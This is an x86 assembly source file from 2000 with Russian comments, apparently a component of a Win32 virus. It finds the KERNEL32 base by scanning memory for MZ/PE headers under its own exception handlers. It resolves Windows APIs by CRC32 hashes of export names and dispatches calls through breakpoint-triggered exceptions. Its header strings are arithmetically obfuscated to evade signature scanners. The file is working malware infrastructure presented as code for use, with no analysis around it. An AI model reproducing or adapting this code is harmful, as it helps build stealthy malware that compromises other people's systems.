; last edit  07.07.2000  bug fix
offset2 macro Arg,RelPoint
offset2&Arg EQU offset Arg - offset RelPoint
        endm
; На входе EDI=Image Base VA.
; Если EDI=0, то инициализируется KERNEL32.dll
Kern32VxInit:   pusha
                call @Kern32VxInitL1
hKernelHahdler:   dd  ?
lpExportTable:    dd  ?
CRC32APIf         dd  ?
@Kern32VxInitL1: pop ebx
                 or edi,edi
                 jne_ @@@L1
                 call GetKernelHahdlerA
                 @@@L1:
                 mov [ebx],EDI
                 mov [ebx+4],EDI
                 mov eax,edi
                 add eax,[eax+3ch] ; eax=offset 2 PE
                 mov esi,[eax+78h] ; esi=Export Table RVA 2 USER32.dll
                 add [ebx+4],esi
                 mov eax,ebx
                 offset2 Call_Win_AIP32,hKernelHahdler
                 add eax,offset2Call_Win_AIP32
                 mov [esp+1ch],eax
                 popa
                 pop ecx
                 push eax
                 xor eax,eax
                 push dword ptr fs:[eax]
                 mov fs:[eax],esp
                 jmp ecx
 ;-------------------------------------------------------------------------
 ExeptionRecord   EQU  4
 ExeptionAddress  EQU  0ch
 ContextBlock     EQU  0ch
 OldESPreg        EQU  0c4h
 pushadd          EQU 20h
Call_Win_AIP32: pusha
		mov edx,[esp+pushadd+ExeptionRecord]
                mov eax,[edx+ExeptionAddress]
               IF DEBUGFLAG
                add eax,3
                cmp word ptr [eax-3],0ffffh
               ELSE
                add eax,1
                cmp byte ptr [eax-1],0cch
               ENDIF
                jne NotKern32VXAPI ;
                ;--------
                 mov ebx,eax        ; ret point
                 mov edx,[esp+pushadd+ContextBlock]
                 mov eax,[edx+OldESPreg]
                 mov ecx,eax
                 mov eax,[eax]    ; Get CRC32
                 mov [ecx],ebx    ; save  ret point
                 call $+5
Call_Win_AIP32L1: pop ebx
                  sub ebx,offset Call_Win_AIP32L1-offset hKernelHahdler
                  mov [ebx+8],eax ; API CRC32
                  mov edi,[ebx]
                  mov esi,[ebx+4]
                  ;esi = Export Table
                  mov ecx,[esi+18h] ;Num of Name Pointers
                  mov edx,edi
                  add edx,[esi+20h] ;Offset 2 Name Pointers RVA
                  push ecx
HEA_HE_OHA:       mov esi,edi
                  add esi,[edx]  ; esi = Name of func
                  call CRCSum
                  cmp [ebx+8],eax
                  je_ BOT_OHA
                  add edx,4
                  loop HEA_HE_OHA
                  pop eax
                  xor eax,eax
                  jmp_ FuncNotFound
          BOT_OHA: pop  eax
                   sub eax,ecx       ; eax=#
                   inc eax
                   mov esi,[ebx+4]
                   shl eax,1 ; *2
                   mov edx,edi
                   add edx,[esi+24h] ; Ordinal Table RVA
                   mov ax,word ptr [edx+eax] ; Func Ordinal }|{                        }
                   sub eax,[esi+10h] ; - Ordinal Base
                   mov esi,[esi+1ch] ; Address Table RVA
                   add esi,edi
                   shl eax,2
                   mov eax,[esi+eax]
                   add eax,edi
                   ; eax=ProcAdderss
                   ;-----------------------------
    FuncNotFound:  xor edx,edx
                   xor ecx,ecx
                   mov edx,fs:[edx]
                   mov edx,[edx]
                   mov fs:[ecx],edx
                   ;-----------------------------
                 OldEDIreg EQU 9ch
                 mov esp,[esp+pushadd+ContextBlock]
                 add esp,OldEDIreg
                 pop edi
                 pop esi
                 pop ebx
                 pop edx
                 pop ecx
                 add esp,4        ; skip eax
                 pop ebp
                 add esp,10h-4
                 pop esp
                 or eax,eax
                 je_ FuncNotFoundL2
                 jmp eax          ; GO GO GO !
NotKern32VXAPI:  popa
                 xor eax,eax
                 inc eax   ; next ERR
                 ret
FuncNotFoundL2:  dec eax    ; eax=-1 В случае если нет такой CRC32
                 ret
;---------------------------------------------------------------------------
; Процедура возвращает:
;     EDI=KernelHahdler
;--------------------------------------------------------------------------
; Найдем кернел
GetKernelHahdlerA:
         push fs
         pusha
         call GetKernelHahdler

         mov eax,[esp]          ; Получили указатель в Kernel32
         mov esp,[esp+8]        ; CTEK наместо

         xor edx,edx             ; ret old seh
         pop dword ptr fs:[edx]  ;
         pop edx                 ;

         ; Теперь поищем MZ
         xor edx,edx
         mov ecx,1000h
         div ecx
         mul ecx
         mov edi,eax
         mov cx,('ZM'-1111h)
         add cx,1111h
SetMySEH:  call MySEH
RetEDISize EQU  offset GdeMZK32 - offset @@GdeMZK32
@@GdeMZK32:
           mov esp,[esp+8]
           mov edi,[esp-4]        ; Востановим после исключения.

           xor eax,eax
           pop dword ptr fs:[eax]
           pop eax

           mov cx,('ZM'-1111h)
           add cx,1111h
           jmp_ SetMySEH

GdeMZK32: pop edi
GdeMZ:   sub edi,1000h
         push edi
         mov ax,word ptr [edi]    ;
         pop edi
         cmp ax,cx                ;
         je_ @MZ
         jmp_ GdeMZ
@MZ:     cmp byte ptr [edi+18h],40h;
         jl_ GdeMZ                  ; Будем искать другой MZ
         mov eax,dword ptr [edi+3ch]
         mov cx,('EP'-2222h)
         add cx,2222h
         cmp word ptr [edi+eax],cx  ; Вроде PE ?
         jne_ GdeMZ
         ExportTable_RVA EQU 78h
         Name_RVA        EQU 0ch
         mov eax,[edi+eax+ExportTable_RVA]        ; ExportTable_RVA
         mov eax,[edi+eax+Name_RVA]
         push edi
         add edi,eax                              ; edi=Имя модуля.
         mov edx,('NREK'-11223344h) ; KERN
         add edx,11223344h
         cmp dword ptr [edi],edx
         jne_ GdeMZK32              ; Ищем дальше ... кто ищет тот ...
         pop edi                    ; EDI= Kernel32 Handler

         xor edx,edx
         pop dword ptr fs:[edx]
         pop edx


         rEDI_ EQU 0
         rESI_ EQU 4
         mov dword ptr [esp+rEDI_],edi
         popa
         pop fs
         ret
GetKernelHahdler:
        xor eax,eax
        push    dword ptr fs:[eax]
        mov     fs:[eax],esp
         ; Генерируем исключение
         mov [eax],eax
;-------------------------------------------------
MySEH:   xor eax,eax
         push    dword ptr fs:[eax] ;
         mov     fs:[eax],esp       ;
         mov eax,dword ptr [esp+4]
         add eax,RetEDISize+1
         jmp eax
include crc32api.inc
;--------------------------------------------------------------------------